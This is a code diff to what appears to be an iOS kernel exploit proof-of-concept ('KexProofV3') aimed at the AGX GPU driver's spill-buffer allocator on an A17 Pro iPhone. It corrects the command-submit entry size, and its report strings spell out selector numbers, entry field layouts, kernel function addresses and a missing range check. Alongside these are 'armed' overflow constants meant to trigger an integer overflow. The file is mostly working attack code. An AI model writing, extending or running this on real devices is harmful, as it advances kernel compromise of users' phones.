@@ -28,7 +28,7 @@
 #define KP_AGX_CL_BODY_OFFSET 0xc8
 #define KP_AGX_CL_BODY_SIZE 0x268
 #define KP_AGX_RECORD_SIZE (KP_AGX_CL_BODY_OFFSET + KP_AGX_CL_BODY_SIZE)
-#define KP_AGX_SUBMIT_ENTRY_SIZE 56
+#define KP_AGX_SUBMIT_ENTRY_SIZE 0x40
 #define KP_AGX_ARMED_FIELD_2C 0x40000000
 #define KP_AGX_ARMED_RAW_N15 0x10000000001ULL
 #define KP_AGX_TOTAL_MULTIPLIER_X2 0xE67000ULL
@@ -424,8 +424,9 @@ static void KPAGXRunSession(NSMutableString *report, BOOL armed) {
     [report appendString:@"=== KexProofV3 AGX allocateSpillBufferData probe ===\n"];
     [report appendString:@"Target: iPhone16,1 / A17 Pro, iOS 27.0.1; user client IOGPUDeviceUserClient (direct container allow, no special entitlement assumed).\n"];
     [report appendString:@"27.0.1 allocator fn 0xfffffff008336530 (6324B); 27.2 fn 0xfffffff00834a5d8 (6576B): 32->64-bit accumulation plus umulh/carry checks.\n"];
-    [report appendString:@"Static ABI: selectors 6 queue (input 0x410/out16), 12 shmem (2 scalars {size,type}/out16 {address,size,id}), 14 notification (2 scalars/out16), 24 bind (2 scalars), 25 submit (4 scalars + 56B entry/out1).\n"];
+    [report appendString:@"Static ABI: selectors 6 queue (input 0x410/out16), 12 shmem (2 scalars {size,type}/out16 {address,size,id}), 14 notification (2 scalars/out16), 24 bind (2 scalars), 25 submit (4 scalars + 64B entry/out1).\n"];
     [report appendString:@"Queue size proof: base IOGPU init uses 0x408, but 27.0.1 AGXAccelerator::start stores 0x410 to device+0x270 at 0xfffffff008325a7c; fn290 returns 0xe00002c2 for a mismatch. Queue type +0x400=0 is valid (<5); +0x404/+0x405 and AGX flags +0x408 may be zero. Constructor returns AGXCommandQueue; no alternate open type is required.\n"];
+    [report appendString:@"Submit proof: scalar[0]=queueID, scalar[1]=0 (unused by fn309), scalar[2]=entryCount=1, scalar[3]=entrySize=0x40; structureInputSize=0x40. fn309 checks count*entrySize and cmdBufArgSize at device+0x260: base IOGPU writes 0x30, AGX start writes 0x40 at 0xfffffff008325a74. Entry: command shmem ID +0x00, segment ID +0x04, sideband ID=0 +0x08; optional notifications/debug and remaining bytes are zero.\n"];
     [report appendString:@"CL stream: top=0x10000; base header=0xc0, bodySize=0x268 at record+0xa4, type=3 at+0xa8; CL body at+0xc8, total record=0x330. CL-relative fields: field_28=+0x100, field_2c=+0x104, field_30=+0x108, n[i]=+0x10c+4*(i-1), n15=+0x148, mode=+0x1f5. fn579 checks body bounds and copies fields; no numeric range validation for field_2c/+0x30. Primary n<=0x10d check is inside the allocator, before their additions.\n"];
     [report appendString:@"Segment: one descriptor at+0x10; kernelCommandStart=0 at+0x18, kernelCommandEnd=0x330 at+0x1c, sideband offset=0 at+0x20, resource count=0 at+0x2c, sideband ID=0. No spray and no KRW.\n"];
 #if KP_AGXSPILL27_ENABLE_ARMED
